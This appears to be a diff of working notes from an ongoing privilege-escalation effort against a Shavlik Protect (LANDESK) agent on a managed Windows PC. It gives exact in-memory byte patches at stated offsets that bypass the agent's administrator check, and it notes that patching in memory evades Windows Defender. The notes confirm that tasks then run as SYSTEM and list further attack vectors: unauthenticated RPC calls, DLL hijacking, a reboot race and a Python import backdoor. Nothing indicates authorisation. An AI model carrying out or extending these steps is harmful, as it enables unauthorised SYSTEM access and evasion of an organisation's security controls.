@@ -137,34 +137,95 @@ Files dropped in `C:\ProgramData\LANDESK\Shavlik Protect\Agent\New\` and `FTQ\` 
 ## Attack Vectors (Priority Order)
 
 ### A. ✅ Patch STAgentCtl.exe Admin Check — IN-MEMORY (HIGH, DONE)
-**Status: Admin check bypass ACHIEVED. But RPC commands still fail with "Unknown error".**
+**Status: Admin check bypass ACHIEVED AND CONFIRMED. `status`, `available-tasks`, `dispatch` all work.**
 
 Binary patching via file modification triggers Windows Defender (blocks read/execute). **In-memory patching** using Add-Type C# works reliably:
 
-**Patch technique:**
+**Patch technique (UPDATED June 17):**
 1. Start STAgentCtl.exe suspended: `CreateProcess(exe, args, ..., CREATE_SUSPENDED)`
 2. Get PEB: `NtQueryInformationProcess(hProcess, 0, pbi, 48, &retLen)` — **MUST use 48 bytes not 24** on x64
 3. Read PEB at offset 8 → `ImageBaseAddress` at PEB offset 0x10
-4. **Patch 1** (admin check function return): `WriteProcessMemory(hp, ImageBase+0x1DCF4, [0xB8,0x01,0,0,0,0xC3,0x90])`
-   - Replaces `33 C9 E8 25 E8 FE FF` (XOR ECX,ECX; CALL admin_check) with `B8 01 00 00 00 C3 90` (MOV EAX,1; RET; NOP)
-5. **Patch 2** (error display NOP): `WriteProcessMemory(hp, ImageBase+0x1DD20, 12x 0x90)`
-   - NOPs `48 8D 0D B9 7E 01 00 E8 F4 E7 FE FF` (LEA error_string; CALL error_display)
+4. **Patch 1 — REAL fix at RVA 0x1D614**: NOP the `je` after IsUserAdministrator check (6 bytes: `0F 84 06 07 00 00` → `90 90 90 90 90 90`)
+5. **Patch 2 — handler early return at RVA 0x1DCF4**: `B8 01 00 00 00 C3 90` (MOV EAX,1; RET; NOP) — belt-and-suspenders
 6. ResumeThread, capture output via file-redirected handles
 
-**Result:** `help` works (exit 0, full usage text). `status`/`available-tasks`/`dispatch` return exit -1 with "Unknown error".
+**Why `help` worked but RPC commands didn't (original approach):** Commands with selector 8 (like `help`) take an early-exit path (0x1D5F4) that never reaches the admin check. Commands with direct selectors (`status`/`dispatch`/`available-tasks`) flow through to 0x1D60A → IsUserAdministrator check → blocked.
 
-**Error string locations:**
-- `"This operation requires administrative rights"` at file offset `0x349E0`, RVA `0x35BE0`, referenced by LEA at 0x1D120
-- `"Unknown error"` at file offset `0x34930`, RVA `0x35B30`, referenced by LEA at 0x1C5E8
+**The "Unknown error" was a side-effect** of NOPing the error display at 0x1DD20 without fixing the admin check — execution continued past the NOP'd error into fallthrough code that produces "Unknown error".
 
-**File patching fails:** Modified STAgentCtl.exe written to C:\Windows\Tasks\ is blocked by Windows Defender (access denied on read/execute). Python-written copies get flagged immediately. In-memory avoids this.
+**Result (with correct patches):**
+- `help` → exit 0, full usage text
+- `status` → exit 0, agent status (unregistered, no agent id)
+- `available-tasks` → exit 0, 3 tasks listed
+- `dispatch --index N` → exit 0, task runs as SYSTEM via STDispatch
+- `dispatch --engine --operation --paramData` → exit 0, runs STAgentUpdater.exe as SYSTEM with raw paramData as arg
 
-**Output capture requires:** `CreateFile` + `SetHandleInformation(h, HANDLE_FLAG_INHERIT, 1)` + `STARTF_USESTDHANDLES`. Anonymous pipes don't work for console apps; file handles do.
+**Simplified version (no ConPTY):** `run_patched_simple.ps1` replaces `CreatePseudoConsole` with file-based stdout/stderr capture via `CreateFile` + `STARTF_USESTDHANDLES` + inheritable `SECURITY_ATTRIBUTES`. Avoids ConPTY deadlock that was hanging the original script.
 
-**C# code structure:** Add-Type with P/Invoke to kernel32 (CreateProcess, Read/WriteProcessMemory, NtQueryInformationProcess, CreateFile, SetHandleInformation, ResumeThread, WaitForSingleObject).
+### A2. ✅ SYSTEM Task Dispatch via Custom Engine/Operation (June 17)
+**Status: CONFIRMED WORKING. `dispatch --engine --operation --paramData` runs STAgentUpdater.exe as SYSTEM.**
 
-### B. Direct RPC Call via NdrClientCall3 (HIGH)
-All 6 endpoints bind without authentication. The MIDL format strings exist in `STAgentFramework.dll` and `STDispatch.exe`. If extracted, `NdrClientCall3` can call `DispatchTask` or `DispatchCheckInAndUpdateAll` directly with SYSTEM privileges — bypassing both the admin check AND STAgentCtl.exe entirely.
+Custom dispatch confirmed via STDispatch log:
+```
+DispatchTask: engine b443f8a1-8af5-4f43-8537-467648fecc4c, operation 9d77c15b-2685-4223-8c50-17e989367eb0
+Command line: "C:\Program Files\LANDESK\Shavlik Protect Agent\STAgentUpdater.exe" dummy
+```
+- `--paramData` is passed RAW as the command-line argument (no template/mapping applied)
+- `--paramData -checkin` → runs STAgentUpdater.exe `-checkin` as SYSTEM (connects to configured console server)
+- Registration state ("Not registered") does NOT block dispatch
+- Only ONE engine available: STAgentUpdater.exe (GUID `b443f8a1-8af5-4f43-8537-467648fecc4c`)
+- Only ONE operation: GUID `9d77c15b-2685-4223-8c50-17e989367eb0`
+- STAgentUpdater.exe commands: `-checkin`, `-checkinAndUpdateAll`, `-updateBinaries`, `-updateData`, `-uninstall`, `-reset_counts` — none provide arbitrary code execution
+
+### STEnginesCatalog.dll Analysis (June 17)
+**NOT an engine registry!** This 967KB DLL is a **patch assessment catalog**:
+- Exports 84 functions about patch detection, product dependencies, patch metadata
+- Class names: `CPatchAssessmentCatalog`, `CPatchMetadataCatalog`, `CDetectableProducts`, `CProductDependencies`, `DPDFactory`
+- Only engine class found: `STEngine` (generic base, no specific engine GUIDs or paths)
+- No GUID-to-binary-path mappings found as ASCII strings or UTF-16 strings
+- No .exe references found in the DLL (only standard Windows DLL imports)
+- Conclusion: The engine mapping is **internal to STDispatch.exe** (not in a configurable file or registry key)
+
+### 5 GUIDs in STDispatch/STAgentCtl — Identified as RPC UUIDs (June 17)
+```
+e2011457-1546-43c5-a5fe-008deee3d3f0
+35138b9a-5d96-4fbd-8e2d-a2440225f93a
+8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a
+4a2f28e3-53b9-4441-ba9c-d69d4a4a6e38
+1f676c76-80e1-4239-95bb-83d0f6d0da78
+```
+Same GUIDs in both STDispatch.exe and STAgentCtl.exe. **Confirmed as RPC interface UUIDs:**
+- All return "Invalid Task" when used as engine GUIDs in `dispatch --engine <GUID>`
+- All return "Invalid Task" when used as operation GUIDs
+- `STAgentCtl.exe` contains `CEngineRPCClient` and `CDispatchRpcTask` classes (connects via these endpoints)
+- The GUIDs correspond to the 6 ncalrpc endpoints enumerated earlier
+
+### Task File Format Unknown (June 17)
+- Log references `tasks/GUID.txt` (relative path from STDispatch working dir)
+- Files are created during dispatch and immediately deleted after completion
+- `C:\Windows\System32\tasks\` is writable by standard user but no files persist
+- Could not capture task file content via polling (file created/deleted too fast)
+- Format remains unknown — prevents planting custom task files for arbitrary SYSTEM execution
+
+### Python Ghost Folders — User Level Only (June 17)
+```
+HKLM: C:\Program Files\Python310\Lib\;C:\Program Files\Python310\DLLs\
+HKCU: C:\Windows\Tasks\Lib\;C:\Windows\Tasks\DLLs\;C:\Windows\Tasks\
+```
+- HKCU path gives user-level (LC2022) Python import hijacking via ghost folders
+- No `_pth` file exists in Python310 dir (so registry paths ARE used)
+- No SYSTEM process on this PC loads Python natively — ghost folders don't give SYSTEM
+
+### Remaining Attack Vectors (Re-prioritized June 17)
+
+**A. Direct RPC via NdrClientCall3 (HIGH)**
+All 6 endpoints bind without authentication. The MIDL format strings exist in `STAgentFramework.dll` (2.1MB .NET assembly — decompilable with dnSpy/ILSpy). If extracted, `NdrClientCall3` can call `DispatchTask` or `DispatchCheckInAndUpdateAll` directly with SYSTEM privileges — bypassing both the admin check AND STAgentCtl.exe entirely.
+
+**B. DLL Hijacking via Dispatched Process (MEDIUM)**
+Need to determine STDispatch's current directory when spawning engines via `CreateProcess`. If the current directory is writable (e.g., `C:\Windows\Tasks\` or `C:\ProgramData\`), plant a DLL that STAgentUpdater.exe loads via DLL search order.
+
+**C. 1AM Reset Race (MEDIUM)**
+PC reboots nightly at 1AM. STDispatch stops and restarts. Brief window for file replacement, junction creation, or config tampering during service restart. C:\ is wiped nightly but LANDESK dir survives.
 
 ### C. Print Spooler Junction (MEDIUM — untested)
 `C:\Windows\System32\spool\PRINTERS` is writable. Microsoft XPS Document Writer available. If spoolsv.exe follows a junction point, a SYSTEM file write to `C:\Program Files\LANDESK\...` might be achievable despite Dec 2024 patches (Gemini: likely mitigated).
@@ -186,7 +247,7 @@ Directories created with `sitecustomize.py` backdoor. No SYSTEM process on this 
 - **SCHTASKS create:** Blocked by Avecto for all task creation
 - **Printer Driver EoP:** Mitigated by Dec 2024 patches (`RestrictDriverInstallationToAdministrators`)
 - **File patching STAgentCtl.exe:** Windows Defender blocks modified binary (access denied on read/execute). In-memory patching bypasses this.
-- **Admin check bypass → "Unknown error":** Admin check is bypassed (help works), but RPC commands (status, dispatch) fail with "Unknown error" at 0x34930. Cause unknown: could be skipped initialization, second admin check, or unregistered agent state.
+- ~~**Admin check bypass → "Unknown error":** Admin check is bypassed (help works), but RPC commands (status, dispatch) fail with "Unknown error" at 0x34930. Cause unknown: could be skipped initialization, second admin check, or unregistered agent state.~~ **RESOLVED: NOP the `je` at the IsUserAdministrator check (RVA 0x1D614) instead of NOPing the error display. See CONTEXT.md.**
 
 ## Important File Locations
 - `dataCache.dat`: `Agent\dataCache.dat` — event cache, 816 bytes
